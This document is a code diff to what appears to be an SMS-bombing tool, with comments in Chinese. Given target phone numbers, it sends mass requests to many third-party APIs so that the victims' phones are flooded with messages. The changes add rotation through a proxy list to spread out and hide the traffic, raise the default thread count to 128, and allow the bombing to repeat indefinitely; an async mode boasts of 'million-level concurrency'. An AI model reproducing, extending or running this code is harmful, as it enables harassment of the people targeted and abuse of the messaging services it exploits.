@@ -11,13 +11,32 @@ import asyncio
 import click
 import httpx
 
-from utils import default_header
+
+from utils import default_header_user_agent
+
 from utils.log import logger
 from utils.models import API
 from utils.req import reqFunc, runAsync
 
 # current directory
 path = pathlib.Path(__file__).parent
+
+
+def load_proxies() -> list:
+    """load proxies for proxy.txt
+        :return: proxies list
+        """
+    proxy_data = []
+    proxy_path = pathlib.Path(path, 'proxy.txt')
+    for line in open(proxy_path):
+        le = line.replace("\r", "").replace("\n", "")
+        if le == '':
+            continue
+        proxy_one = {
+            'all://': 'http://' + le
+        }
+        proxy_data.append(proxy_one)
+    return proxy_data
 
 
 def load_json() -> List[API]:
@@ -67,28 +86,32 @@ def load_getapi() -> list:
 
 
 @click.command()
-@click.option("--thread", "-t", help="线程数(默认64)", default=64)
+@click.option("--thread", "-t", help="线程数(默认128)", default=128)
 @click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
-@click.option('--super', "-s", is_flag=True, help="循环模式")
-@click.option('--interval', "-i", default=60, help="循环间隔时间(默认60s)", type=int)
-def run(thread: int, phone: Union[str, tuple], interval: int, super: bool = False):
+@click.option('--frequency', "-f", default=10, help="执行次数(默认10次，设置为999999999为无限执行不退出)", type=int)
+def run(thread: int, phone: Union[str, tuple], frequency: int):
     """传入线程数和手机号启动轰炸,支持多手机号"""
-    logger.info(f"循环模式:{super},手机号:{phone},线程数:{thread},循环间隔:{interval}")
+    logger.info(f"手机号:{phone},线程数:{thread},执行次数:{frequency}")
 
     with ThreadPoolExecutor(max_workers=thread) as pool:
         try:
             _api = load_json()
             _api_get = load_getapi()
+            _proxies = load_proxies()
         except ValueError:
             logger.error("读取接口出错!正在重新下载接口数据!....")
             update()
             sys.exit(1)
-        i = 0
-        if super:
-            while True:
-                i += 1
-                logger.success(f"第{i}波轰炸开始！")
+        for i in range(1, frequency + 1):
+            logger.success(f"第{i}波轰炸开始！")
+            _process = ''
+            for proxy in _proxies:
+                logger.success(f"第{i}波轰炸 - 当前正在使用代理："+proxy['all://']+" 进行轰炸...")
+                # 不可用的代理或API过多可能会影响轰炸效果
+                # for api_get in _api_get:
+                #     _process = pool.submit(reqFunc, api_get, phone, proxy)
                 for api in _api:
+
                     pool.submit(reqFunc, api, phone)
                 for api_get in _api_get:
                     pool.submit(reqFunc, api_get, phone)
@@ -101,13 +124,16 @@ def run(thread: int, phone: Union[str, tuple], interval: int, super: bool = Fals
                 pool.submit(reqFunc, api_get, phone)
 
 
+
 @click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
 @click.command()
 def asyncRun(phone):
     """以最快的方式请求接口(真异步百万并发)"""
     _api = load_json()
     _api_get = load_getapi()
-    apis = _api+_api_get
+
+    apis = _api + _api_get
+
 
     loop = asyncio.get_event_loop()
     loop.run_until_complete(runAsync(apis, phone))
@@ -119,7 +145,9 @@ def oneRun(phone):
     """单线程(测试使用)"""
     _api = load_json()
     _api_get = load_getapi()
-    apis = _api+_api_get
+
+    apis = _api + _api_get
+
 
     for api in apis:
         try:
